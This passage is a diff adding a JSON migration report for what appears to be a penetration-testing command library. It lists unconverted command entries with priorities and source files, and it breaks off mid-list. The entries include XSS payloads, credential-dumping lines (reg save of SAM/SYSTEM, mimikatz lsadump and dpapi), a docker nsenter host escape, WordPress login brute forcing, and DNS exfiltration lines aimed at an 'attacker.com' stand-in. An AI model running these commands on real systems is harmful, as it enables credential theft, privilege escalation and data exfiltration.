@@ -1,0 +1,4011 @@
+{
+  "summary": {
+    "total_failed": 352,
+    "high_priority": 21,
+    "medium_priority": 205,
+    "context_dependent": 75
+  },
+  "high_priority": [
+    {
+      "text": "Import SharpHound data",
+      "count": 1,
+      "category": "powershell_import",
+      "action": "CREATE_IMPORT_CMD",
+      "preservation_note": "Create PowerShell import command",
+      "suggested_id": "import-sharphound",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "Get-CimInstance win32_process",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-ciminstance-win",
+      "sample_file": "data/commands/monitoring/process-enumeration.json"
+    },
+    {
+      "text": "Get-ComputerInfo (PowerShell)",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-computerinfo-powershell",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "PowerUp's Get-UnquotedService",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "import-powerup",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "PowerUp's Get-ModifiableServiceFile",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "import-powerup",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "PowerUp's Get-RegistryAlwaysInstallElevated",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "import-powerup",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Get-ADUser $env:USERNAME",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-aduser",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-itemproperty-hklm",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Get-ScheduledTask | Select TaskName,Principal",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-scheduledtask-select",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-acl-hklm",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-itemproperty-hklm",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Import PowerView",
+      "count": 30,
+      "category": "powershell_import",
+      "action": "CREATE_IMPORT_CMD",
+      "preservation_note": "Create PowerShell import command",
+      "suggested_id": "import-powerview",
+      "sample_file": "data/commands/enumeration/ad-powerview-core.json"
+    },
+    {
+      "text": "Import PowerView: . .\\PowerView.ps1",
+      "count": 1,
+      "category": "powershell_import",
+      "action": "CREATE_IMPORT_CMD",
+      "preservation_note": "Create PowerShell import command",
+      "suggested_id": "import-powerview",
+      "sample_file": "data/commands/enumeration/ad-powerview-core.json"
+    },
+    {
+      "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+      "count": 2,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-aduser",
+      "sample_file": "data/commands/enumeration/ad-legacy-enumeration.json"
+    },
+    {
+      "text": "Get-NetGroup",
+      "count": 4,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-netgroup",
+      "sample_file": "data/commands/enumeration/ad-legacy-enumeration.json"
+    },
+    {
+      "text": "Get-ADUser -Filter *",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-aduser",
+      "sample_file": "data/commands/enumeration/ad-legacy-enumeration.json"
+    },
+    {
+      "text": "Get-GPPPassword (PowerSploit)",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-gpppassword-powersploit",
+      "sample_file": "data/commands/enumeration/ad-session-share-enum.json"
+    },
+    {
+      "text": "Get-NetUser -AdminCount",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-netuser",
+      "sample_file": "data/commands/enumeration/ad-powershell-ldap.json"
+    },
+    {
+      "text": "Get-Acl",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-acl",
+      "sample_file": "data/commands/enumeration/ad-powerview-permissions.json"
+    },
+    {
+      "text": "Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty'}",
+      "count": 1,
+      "category": "powershell_cmdlet",
+      "action": "CREATE_PS_CMD",
+      "preservation_note": "Create PowerShell cmdlet command",
+      "suggested_id": "get-objectacl-activedirectoryrights",
+      "sample_file": "data/commands/enumeration/ad-powerview-permissions.json"
+    },
+    {
+      "text": "NTLM hash obtained",
+      "count": 5,
+      "category": "state_condition",
+      "action": "CREATE_VERIFY_CMD",
+      "preservation_note": "Create verification/check command",
+      "suggested_id": "verify-ntlm-hash",
+      "sample_file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+    }
+  ],
+  "medium_priority": [
+    {
+      "text": "nessus scan",
+      "count": 1,
+      "category": "tool_with_action",
+      "action": "CREATE_TOOL_CMD",
+      "preservation_note": "Create command for tool with action",
+      "suggested_id": "nessus-scan",
+      "sample_file": "data/commands/recon.json"
+    },
+    {
+      "text": "burp intruder",
+      "count": 2,
+      "category": "tool_with_action",
+      "action": "CREATE_TOOL_CMD",
+      "preservation_note": "Create command for tool with action",
+      "suggested_id": "burp-intruder",
+      "sample_file": "data/commands/web/general.json"
+    },
+    {
+      "text": "<svg onload=alert(1)>",
+      "count": 1,
+      "category": "payload_html",
+      "action": "CREATE_PAYLOAD_CMD",
+      "preservation_note": "Create XSS test command with payload in command field",
+      "suggested_id": "xss-test-svg-onload",
+      "sample_file": "data/commands/web/general.json"
+    },
+    {
+      "text": "<body onload=alert(1)>",
+      "count": 1,
+      "category": "payload_html",
+      "action": "CREATE_PAYLOAD_CMD",
+      "preservation_note": "Create XSS test command with payload in command field",
+      "suggested_id": "xss-test-body-onload",
+      "sample_file": "data/commands/web/general.json"
+    },
+    {
+      "text": "python requests.post()",
+      "count": 1,
+      "category": "code_snippet",
+      "action": "CREATE_EXAMPLE_CMD",
+      "preservation_note": "Create command entry for language-specific alternative",
+      "suggested_id": "python-requests-post",
+      "sample_file": "data/commands/web/general.json"
+    },
+    {
+      "text": "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php",
+      "count": 1,
+      "category": "tool_with_action",
+      "action": "CREATE_TOOL_CMD",
+      "preservation_note": "Create command for tool with action",
+      "suggested_id": "wfuzz-z-file",
+      "sample_file": "data/commands/web/wordpress.json"
+    },
+    {
+      "text": "wpscan-enumerate-all (to discover usernames)",
+      "count": 1,
+      "category": "tool_with_action",
+      "action": "CREATE_TOOL_CMD",
+      "preservation_note": "Create command for tool with action",
+      "suggested_id": "wpscan-enumerate-all",
+      "sample_file": "data/commands/web/wordpress.json"
+    },
+    {
+      "text": "burp suite XML-RPC plugin",
+      "count": 1,
+      "category": "tool_with_action",
+      "action": "CREATE_TOOL_CMD",
+      "preservation_note": "Create command for tool with action",
+      "suggested_id": "burp-suite-xml",
+      "sample_file": "data/commands/web/wordpress.json"
+    },
+    {
+      "text": "curl -s <URL>/feed/ | grep generator",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "curl-s-url",
+      "sample_file": "data/commands/web/wordpress.json"
+    },
+    {
+      "text": "Neo4j running",
+      "count": 2,
+      "category": "state_condition",
+      "action": "CREATE_VERIFY_CMD",
+      "preservation_note": "Create verification/check command",
+      "suggested_id": "neo-j-running",
+      "sample_file": "data/commands/generated/active-directory-additions.json"
+    },
+    {
+      "text": "Transfer LinEnum.sh",
+      "count": 1,
+      "category": "transfer_instruction",
+      "action": "CREATE_TRANSFER_CMD",
+      "preservation_note": "Create file transfer command",
+      "suggested_id": "transfer-linenum-sh",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "chmod +x",
+      "count": 3,
+      "category": "permission_cmd",
+      "action": "CREATE_UTILITY_CMD",
+      "preservation_note": "Create permission management command",
+      "suggested_id": "chmod-executable",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "Transfer script",
+      "count": 1,
+      "category": "transfer_instruction",
+      "action": "CREATE_TRANSFER_CMD",
+      "preservation_note": "Create file transfer command",
+      "suggested_id": "transfer-script",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "Transfer pspy64/pspy32",
+      "count": 1,
+      "category": "transfer_instruction",
+      "action": "CREATE_TRANSFER_CMD",
+      "preservation_note": "Create file transfer command",
+      "suggested_id": "transfer-pspy-pspy",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "Transfer PowerUp.ps1",
+      "count": 1,
+      "category": "transfer_instruction",
+      "action": "CREATE_TRANSFER_CMD",
+      "preservation_note": "Create file transfer command",
+      "suggested_id": "import-powerup",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "Transfer PrivescCheck.ps1",
+      "count": 1,
+      "category": "transfer_instruction",
+      "action": "CREATE_TRANSFER_CMD",
+      "preservation_note": "Create file transfer command",
+      "suggested_id": "transfer-privesccheck-ps",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "Transfer Seatbelt.exe",
+      "count": 1,
+      "category": "transfer_instruction",
+      "action": "CREATE_TRANSFER_CMD",
+      "preservation_note": "Create file transfer command",
+      "suggested_id": "transfer-seatbelt-exe",
+      "sample_file": "data/commands/generated/post-exploitation-additions.json"
+    },
+    {
+      "text": "cat /proc/*/cmdline | tr '\\0' ' '",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-proc-cmdline",
+      "sample_file": "data/commands/monitoring/process-enumeration.json"
+    },
+    {
+      "text": "ps aux | grep <PATTERN>",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "ps-aux-grep",
+      "sample_file": "data/commands/monitoring/process-enumeration.json"
+    },
+    {
+      "text": "ps aux | grep <PROCESS_NAME> | awk '{print $2}'",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "ps-aux-grep",
+      "sample_file": "data/commands/monitoring/process-enumeration.json"
+    },
+    {
+      "text": "cat /proc/<PID>/cmdline | tr '\\0' ' '",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-proc-pid",
+      "sample_file": "data/commands/monitoring/process-enumeration.json"
+    },
+    {
+      "text": "cat /var/spool/cron/crontabs/<USERNAME>",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-var-spool",
+      "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+    },
+    {
+      "text": "less /etc/crontab",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "less-etc-crontab",
+      "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+    },
+    {
+      "text": "find /etc/cron* -type f",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "find-etc-cron",
+      "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+    },
+    {
+      "text": "at (command-line AT utility)",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "at-command-line",
+      "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+    },
+    {
+      "text": "ls -la /var/spool/at/",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "ls-la-var",
+      "sample_file": "data/commands/monitoring/scheduled-tasks.json"
+    },
+    {
+      "text": "tail-follow-log /var/log/syslog",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "tail-follow-log",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "journalctl -k (kernel messages via journald)",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "journalctl-k-kernel",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "journalctl -kf (kernel messages via journald)",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "journalctl-kf-kernel",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "journalctl -u ssh | grep -i failed",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "journalctl-u-ssh",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "journalctl | grep sudo.*COMMAND",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "journalctl-grep-sudo",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "journalctl | grep 'Failed password'",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "journalctl-grep-failed",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "dmesg-kernel-messages (kernel only)",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "dmesg-kernel-messages",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "ls /etc/init.d/",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "ls-etc-init",
+      "sample_file": "data/commands/monitoring/service-enumeration.json"
+    },
+    {
+      "text": "top -bn1 -o %MEM | head -20",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "top-bn-o",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "top -bn1 -o %CPU | head -20",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "top-bn-o",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "cat /proc/meminfo",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-proc-meminfo",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "top -bn1",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "top-bn",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "sar -u 1 5",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "sar-u",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "cat /proc/loadavg",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-proc-loadavg",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "ls -l /proc/*/fd/ (manual check)",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "ls-l-proc",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "lsof +d <DIRECTORY> (non-recursive, faster)",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "lsof-d-directory",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "cat /var/log/wtmp | utmpdump",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-var-log",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "# Install ClamAV on Windows test system:\n# Download from: https://www.clamav.net/downloads",
+      "count": 1,
+      "category": "transfer_instruction",
+      "action": "CREATE_TRANSFER_CMD",
+      "preservation_note": "Create file transfer command",
+      "suggested_id": "install-clamav-on",
+      "sample_file": "data/commands/av-evasion/signature-evasion.json"
+    },
+    {
+      "text": "cat /etc/group | grep docker",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-etc-group",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "stat /var/run/docker.sock",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "stat-var-run",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "docker pull alpine (if no images available)",
+      "count": 1,
+      "category": "state_condition",
+      "action": "CREATE_VERIFY_CMD",
+      "preservation_note": "Create verification/check command",
+      "suggested_id": "docker-pull-alpine",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh",
+      "count": 2,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "docker-run-pid",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "cat /mnt/etc/passwd",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "cat-mnt-etc",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "docker-mount-escape (preferred method)",
+      "count": 1,
+      "category": "command_full",
+      "action": "CREATE_FULL_CMD",
+      "preservation_note": "Create complete command entry",
+      "suggested_id": "docker-mount-escape",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    }
+  ],
+  "context_dependent": [
+    {
+      "text": "HTTP server on attacker",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "http-server-on",
+      "sample_file": "data/commands/generated/file-transfer-additions.json"
+    },
+    {
+      "text": "grep time range in syslog files (manual)",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "grep-time-range",
+      "sample_file": "data/commands/monitoring/log-monitoring.json"
+    },
+    {
+      "text": "w (includes user info)",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "w-includes-user",
+      "sample_file": "data/commands/monitoring/resource-monitoring.json"
+    },
+    {
+      "text": "docker info",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "docker-info",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "docker version",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "docker-version",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "docker pull ubuntu (larger but more tools)",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "docker-pull-ubuntu",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "docker pull busybox (even smaller than alpine)",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "docker-pull-busybox",
+      "sample_file": "data/commands/post-exploit/linux-docker-commands.json"
+    },
+    {
+      "text": "python3 smbserver.py share .",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "python-smbserver-py",
+      "sample_file": "data/commands/post-exploit/general-transfer.json"
+    },
+    {
+      "text": "samba service",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "samba-service",
+      "sample_file": "data/commands/post-exploit/general-transfer.json"
+    },
+    {
+      "text": "bitsadmin for newer Windows",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "bitsadmin-for-newer",
+      "sample_file": "data/commands/post-exploit/general-transfer.json"
+    },
+    {
+      "text": "certutil base64 encoding",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "certutil-base-encoding",
+      "sample_file": "data/commands/post-exploit/general-transfer.json"
+    },
+    {
+      "text": "dig $data.attacker.com",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "dig-data-attacker",
+      "sample_file": "data/commands/post-exploit/general-transfer.json"
+    },
+    {
+      "text": "host $data.attacker.com",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "host-data-attacker",
+      "sample_file": "data/commands/post-exploit/general-transfer.json"
+    },
+    {
+      "text": "ping $data.attacker.com",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "ping-data-attacker",
+      "sample_file": "data/commands/post-exploit/general-transfer.json"
+    },
+    {
+      "text": "bitsadmin download",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "bitsadmin-download",
+      "sample_file": "data/commands/post-exploit/exfiltration.json"
+    },
+    {
+      "text": "rsync for larger transfers",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "rsync-for-larger",
+      "sample_file": "data/commands/post-exploit/exfiltration.json"
+    },
+    {
+      "text": "SFTP for interactive transfer",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "sftp-for-interactive",
+      "sample_file": "data/commands/post-exploit/exfiltration.json"
+    },
+    {
+      "text": "socat for bidirectional transfer",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "socat-for-bidirectional",
+      "sample_file": "data/commands/post-exploit/exfiltration.json"
+    },
+    {
+      "text": "TFTP for simpler transfers",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "tftp-for-simpler",
+      "sample_file": "data/commands/post-exploit/exfiltration.json"
+    },
+    {
+      "text": "SFTP for encrypted transfers",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "sftp-for-encrypted",
+      "sample_file": "data/commands/post-exploit/exfiltration.json"
+    },
+    {
+      "text": "certutil for simpler syntax",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "certutil-for-simpler",
+      "sample_file": "data/commands/post-exploit/exfiltration.json"
+    },
+    {
+      "text": "Use individual PowerUp functions",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "import-powerup",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Manual MSI creation with WiX Toolset",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "manual-msi-creation",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Manual searchsploit of OS version",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "manual-searchsploit-of",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "mimikatz: vault::list",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "import-mimikatz",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "rundll32 keymgr.dll,KRShowKeyMgr",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "rundll-keymgr-dll",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Use mimikatz lsadump::sam",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "import-mimikatz",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "wmic os get Caption,Version,BuildNumber",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "wmic-os-get",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "dir C:\\Windows\\System32\\Tasks",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "dir-c-windows",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "reg save HKLM\\SAM sam.save",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "reg-save-hklm",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "reg save HKLM\\SYSTEM system.save",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "reg-save-hklm",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "mimikatz dpapi::masterkey",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "import-mimikatz",
